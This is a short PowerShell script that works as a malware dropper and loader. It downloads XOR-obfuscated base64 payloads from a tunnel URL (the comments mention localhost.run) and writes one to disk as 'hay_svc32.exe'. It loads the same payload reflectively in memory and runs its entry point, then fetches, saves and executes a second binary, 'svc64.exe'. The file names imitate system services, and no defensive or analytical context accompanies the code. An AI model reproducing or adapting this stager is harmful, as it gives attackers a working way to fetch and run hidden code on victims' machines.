// Set Variables :

$TUNNEL = "https:github.com/...."   
$DROP   = "C:\installs\VSTO"
$KEY    = 0xAA

function Decode-XOR {
    param($b64)
    $enc = [Convert]::FromBase64String($b64.Trim())
    $dec = New-Object Byte[] $enc.Length
    for ($i=0;$i -lt $enc.Length;$i++){$dec[$i]=$enc[$i] -bxor $KEY}
    return $dec
}

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

// Download

$wc = New-Object Net.WebClient

# If using localhost.run (no extra header needed):
$b64 = $wc.DownloadString("$TUNNEL/hay.b64")

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

// Decos

$bytes = Decode-XOR $b64
[IO.File]::WriteAllBytes("$DROP\hay_svc32.exe", $bytes)

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

// PSP

$bytes = Decode-XOR $b64
$asm   = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, @(,[string[]]@()))

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

// BCK

$b64b = $wc.DownloadString("$TUNNEL/w32k.b64")
$bytesb = Decode-XOR $b64b
[IO.File]::WriteAllBytes("$DROP\svc64.exe", $bytesb)
& "$DROP\svc64.exe"
Start-Sleep -Seconds 5